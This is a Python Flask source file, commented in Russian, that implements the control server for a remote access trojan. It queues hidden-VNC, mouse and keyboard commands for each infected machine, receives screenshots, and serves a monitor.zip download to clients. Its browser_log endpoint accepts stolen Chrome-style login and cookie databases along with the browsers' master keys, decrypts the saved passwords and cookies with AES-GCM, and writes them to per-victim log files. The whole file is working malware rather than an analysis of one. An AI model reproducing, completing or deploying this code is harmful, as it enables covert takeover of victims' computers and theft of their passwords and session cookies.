import base64
import sqlite3
import time

from flask_socketio import SocketIO
from flask import Flask, request, render_template, jsonify, send_from_directory
import json
from flask_sqlalchemy import SQLAlchemy
import os
from Crypto.Cipher import AES


app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.db'
db = SQLAlchemy(app)
socketio = SocketIO(app)

IP = "0.0.0.0"
PORT = "5000"
HTTP = "http://0.0.0.0:5000"

# Здесь будет храниться команда для каждого уникального идентификатора
commands = {}


@app.route('/users')
def users():
    users = Users.query.all()
    return render_template('users.html', users=users)


class Users(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    unique_id = db.Column(db.String(50), unique=True, nullable=False)

    def __repr__(self):
        return '<Users %r>' % self.unique_id


@app.route('/receive_id', methods=['POST'])
def receive_id():
    data = request.json
    unique_id = data.get('Client')

    if not unique_id:
        return json.dumps({'message': 'Уникальный ID не найден.'}, ensure_ascii=False), 400

    user = Users.query.filter_by(unique_id=unique_id).first()
    if user:
        return json.dumps({'message': 'Уникальный ID уже существует.'}, ensure_ascii=False), 409

    new_user = Users(unique_id=unique_id)
    db.session.add(new_user)
    db.session.commit()

    return json.dumps({'message': 'Уникальный ID добавлен!'}, ensure_ascii=False), 201


@app.route('/user/<unique_id>', methods=['GET'])
def user_page(unique_id):
    user = Users.query.filter_by(unique_id=unique_id).first()
    if not user:
        return json.dumps({'message': f'Пользователь с уникальным идентификатором {unique_id} не найден.'}, ensure_ascii=False), 404
    return render_template('user_page.html', unique_id=unique_id)


@app.route('/start_hvnc/<unique_id>', methods=['POST'])
def start_hvnc(unique_id):
    """При нажатии на кнопку Start HVNC на сайте, сюда отправляется json в котором находится команда. Команда попадает в
    commands = {} для конкретного ID"""
    # Получаем команду из тела запроса
    command = request.json.get('command')
    if not command:
        return json.dumps({'error': 'Команда не поступала.'}, ensure_ascii=False), 400

    # Сохраняем команду для данного уникального идентификатора
    commands[unique_id] = command

    return json.dumps({'message': 'Команда сохранена.'}, ensure_ascii=False), 200


@app.route('/stop_hvnc/<unique_id>', methods=['POST'])
def stop_hvnc(unique_id):
    """При нажатии на кнопку Stop HVNC на сайте, сюда отправляется json в котором находится команда. Команда попадает в
    commands = {} для конкретного ID"""
    # Получаем команду из тела запроса
    command = request.json.get('command')
    if not command:
        return json.dumps({'error': 'Команда не поступала.'}, ensure_ascii=False), 400

    # Сохраняем команду для данного уникального идентификатора
    commands[unique_id] = command

    return json.dumps({'message': 'Команда сохранена.'}, ensure_ascii=False), 200


@app.route('/requests/<unique_id>', methods=['GET', 'POST'])
def handle_requests(unique_id):
    """Берется команда из commands = {} для конкретного ID и когда клиент отправляет запрос на /requests/<unique_id>,
    ему передается команда из commands = {}"""
    # Проверяем, есть ли команда для данного уникального идентификатора
    if unique_id in commands:
        # Сохраняем команду для возврата
        command = commands[unique_id]
        # Удаляем команду из commands
        del commands[unique_id]
        # Возвращаем команду
        return json.dumps({'command': command}, ensure_ascii=False), 200
    else:
        return json.dumps({'error': 'Нет команды для данного ID.'}, ensure_ascii=False), 404


@app.route('/download_monitor')
def download_monitor():
    directory = 'monitor'
    filename = 'monitor.zip'
    return send_from_directory(directory, filename, as_attachment=True)


@app.route('/hvnc/<unique_id>', methods=['GET'])
def hvnc_page(unique_id):
    """После нажатия на кнопку Start HVNC переходит на страницу hvnc_page"""
    user = Users.query.filter_by(unique_id=unique_id).first()
    if not user:
        return json.dumps({'message': f'Пользователь с уникальным идентификатором {unique_id} не найден.'}, ensure_ascii=False), 404
    return render_template('hvnc_page.html', unique_id=unique_id)


@app.route('/start_hvnc_chrome/<unique_id>', methods=['POST'])
def start_hvnc_chrome(unique_id):
    """При нажатии на кнопку Chrome на странице hvnc_page, сюда отправляется json в котором находится команда. Команда
    попадает в commands = {} для конкретного ID"""
    # Получаем команду из тела запроса
    command = request.json.get('command')
    if not command:
        return json.dumps({'error': 'Команда не поступала.'}, ensure_ascii=False), 400

    # Сохраняем команду для данного уникального идентификатора
    commands[unique_id] = command

    return json.dumps({'message': 'Команда сохранена.'}, ensure_ascii=False), 200


@app.route('/start_hvnc_explorer/<unique_id>', methods=['POST'])
def start_hvnc_explorer(unique_id):
    """При нажатии на кнопку Chrome на странице hvnc_page, сюда отправляется json в котором находится команда. Команда
    попадает в commands = {} для конкретного ID"""
    # Получаем команду из тела запроса
    command = request.json.get('command')
    if not command:
        return json.dumps({'error': 'Команда не поступала.'}, ensure_ascii=False), 400

    # Сохраняем команду для данного уникального идентификатора
    commands[unique_id] = command

    return json.dumps({'message': 'Команда сохранена.'}, ensure_ascii=False), 200


@app.route('/upload_screenshot/<unique_id>', methods=['POST'])
def upload_screenshot(unique_id):
    """Принимаем скриншоты в base64 формате для определенного уникального ID"""
    data = request.json
    screenshot_base64 = data.get('screenshot')

    if not screenshot_base64:
        return json.dumps({'message': 'Скриншот не найден.'}, ensure_ascii=False), 400

    try:
        # Отправляем base64 данные изображения по веб-сокетам
        socketio.emit('image', {'image_data': screenshot_base64, 'unique_id': unique_id})
    except Exception as e:
        return json.dumps({'message': f'Ошибка при отправке скриншота: {str(e)}'}, ensure_ascii=False), 500

    return json.dumps({'message': 'Скриншот успешно загружен.'}, ensure_ascii=False), 200


@socketio.on('connect')
def handle_connect():
    print('Client connected')


@app.route('/save_coordinates/<unique_id>', methods=['POST'])
def save_coordinates(unique_id):
    """Принимаем координаты от клиента и сохраняем их для определенного уникального ID"""
    data = request.json
    x = data.get('x')
    y = data.get('y')

    if x is None or y is None:
        return json.dumps({'error': 'Координаты не найдены.'}, ensure_ascii=False), 400

    # Формируем команду на основе полученных координат
    command = f'move_mouse {x} {y}'  # Пример команды, замените на свой формат команды

    # Сохраняем команду для данного уникального идентификатора
    commands[unique_id] = command

    return json.dumps({'message': 'Координаты сохранены успешно.'}, ensure_ascii=False), 200


@app.route('/save_key/<unique_id>', methods=['POST'])
def save_key(unique_id):
    """Принимаем код клавиши от клиента и сохраняем его для определенного уникального ID"""
    data = request.json
    key_code = data.get('key')

    if key_code is None:
        return jsonify({'error': 'Код клавиши не найден.'}), 400

    # Формируем команду на основе полученного кода клавиши
    command = f'press_key {key_code}'  # Пример команды, замените на свой формат команды

    # Сохраняем команду для данного уникального идентификатора
    commands[unique_id] = command

    return jsonify({'message': 'Код клавиши сохранен успешно.'}), 200


def decrypt_password(buffer, master_key):
    try:
        iv = buffer[3:15]
        payload = buffer[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return f"Error decrypting password: {e}"


def decrypt_cookie(buffer, master_key):
    try:
        iv = buffer[3:15]
        payload = buffer[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_cookie = cipher.decrypt(payload)[:-16].decode()
        return decrypted_cookie
    except Exception as e:
        return f"Error decrypting cookie: {e}"


def process_cookies(cookies_db, master_key, cookies_file_path):
    try:
        # Создание пустой строки, куда будут добавляться расшифрованные cookies
        cookies_list = ''

        # Создание временной копии базы данных cookies
        temp_cookies_db = os.path.join(os.path.dirname(cookies_file_path), f"temp_cookies_db_{time.time()}.db")

        # Запись данных о cookies во временный файл базы данных
        with open(temp_cookies_db, "wb") as f:
            f.write(cookies_db)

        # Подключение к временной базе данных cookies
        conn = sqlite3.connect(temp_cookies_db)
        cursor = conn.cursor()

        # Выполнение запроса на выборку данных о cookies
        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")

        # Итерация по результатам запроса
        for item in cursor.fetchall():
            try:
                # Расшифровка значения cookies
                decrypted_value = decrypt_cookie(item[2], master_key)

                # Если значение успешно расшифровано, добавляем информацию о cookies в строку
                if decrypted_value:
                    cookies_list += f'{item[0]}\t{str(bool(item[5])).upper()}\t{item[3]}\t{str(bool(item[6])).upper()}\t{item[4]}\t{item[1]}\t{decrypted_value}\n'
            except sqlite3.Error as e:
                # Обработка ошибок при расшифровке cookies
                print(f"Error cookies: {e}")

        # Закрытие соединения с базой данных и удаление временной копии
        conn.close()
        os.remove(temp_cookies_db)

        # Если есть расшифрованные cookies, записываем их в файл
        if cookies_list:
            with open(cookies_file_path, 'w') as cookies_file:
                cookies_file.write(cookies_list)

    except Exception as e:
        # Обработка общих ошибок в процессе обработки cookies
        print(f"Error cookies: {e}")
        

@app.route('/browser_log/<unique_id>', methods=['POST'])
def receive_browser_log(unique_id):
    try:
        # Получение JSON данных из запроса
        data = request.json

        # Проверка, что данные существуют и являются словарем
        if data is None or not isinstance(data, dict):
            return json.dumps({'error': 'Некорректный формат данных.'}, ensure_ascii=False), 400

        # Получение строки с данными клиента из запроса
        client_data_str = data.get("Client")
        if client_data_str is None:
            return json.dumps({'error': 'Данные для браузеров отсутствуют в запросе.'}, ensure_ascii=False), 400

        # Декодирование JSON строки с данными клиента в словарь
        client_data = json.loads(client_data_str)

        # Создание директории для логов с уникальным идентификатором, если она не существует
        unique_id_logs_dir = os.path.join(app.root_path, 'logs', unique_id)
        os.makedirs(unique_id_logs_dir, exist_ok=True)

        # Путь к файлу для хранения паролей
        passwords_file_path = os.path.join(unique_id_logs_dir, 'passwords.txt')

        # Открытие файла для записи паролей
        with open(passwords_file_path, 'w') as passwords_file:
            for browser_name, browser_data in client_data.items():
                # Получение ключа в Base64 формате из данных браузера
                key_base64 = browser_data.get("key")
                if key_base64 is None:
                    print(f'В браузере {browser_name} отсутствует ключ.')
                    continue

                # Декодирование ключа из Base64
                key = base64.b64decode(key_base64)

                for param_name, param_value in browser_data.items():
                    # Пропуск параметра с ключом
                    if param_name == "key":
                        continue

                    # Если параметр является списком
                    if isinstance(param_value, list):
                        for idx, file_data in enumerate(param_value):
                            try:
                                # Декодирование данных из Base64
                                decoded_data = base64.b64decode(file_data)
                                # Формирование имени файла для базы данных
                                db_name = f'{browser_name}_{param_name}_{idx}.db'
                                db_path = os.path.join(unique_id_logs_dir, db_name)

                                # Запись декодированных данных в файл базы данных
                                with open(db_path, 'wb') as db_file:
                                    db_file.write(decoded_data)

                                # Обработка логинов и паролей
                                if (param_name == "login_data"):
                                    connection = sqlite3.connect(db_path)
                                    cursor = connection.cursor()
                                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                                    for row in cursor.fetchall():
                                        origin_url = row[0]
                                        username_value = row[1]
                                        encrypted_password = row[2]

                                        # Вызывается функция decrypt_password в которую передается зашифрованный пароль и ключ который был ранее декодирован из base64
                                        decrypted_password = decrypt_password(encrypted_password, key)
                                        if decrypted_password and username_value:
                                            # Запись информации о пароле в файл
                                            passwords_file.write(f'Browser: {browser_name}\n')
                                            passwords_file.write(f'Origin URL: {origin_url}\n')
                                            passwords_file.write(f'Username: {username_value}\n')
                                            passwords_file.write(f'Password: {decrypted_password}\n')
                                            passwords_file.write('\n')

                                    print(f"Файл {db_name} успешно сохранен и пароли расшифрованы.")
                                    connection.close()

                                # Обработка cookies
                                elif param_name == "cookies":
                                    cookies_file_path = os.path.join(unique_id_logs_dir,
                                                                     f'cookies_{browser_name}_{idx}.txt')
                                    # Вызывается функция process_cookie в которую передается ключ, декодированные данные куки и путь до файла в которрый будут записываться куки
                                    process_cookies(decoded_data, key, cookies_file_path)
                                    print(f"Файл {db_name} успешно сохранен и cookies расшифрованы.")

                                # Удаление временного файла базы данных после обработки
                                os.remove(db_path)

                            except Exception as e:
                                print(f"Ошибка при обработке файла: {str(e)}")

        print("Получены данные от клиента с уникальным идентификатором:", unique_id)

        return json.dumps({'message': 'Данные успешно получены и обработаны.'}, ensure_ascii=False), 200

    except Exception as e:
        # Возврат ошибки в случае исключения
        return json.dumps({'error': f'Ошибка при обработке данных: {str(e)}'}, ensure_ascii=False), 500


if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host=IP, port=PORT, debug=True)
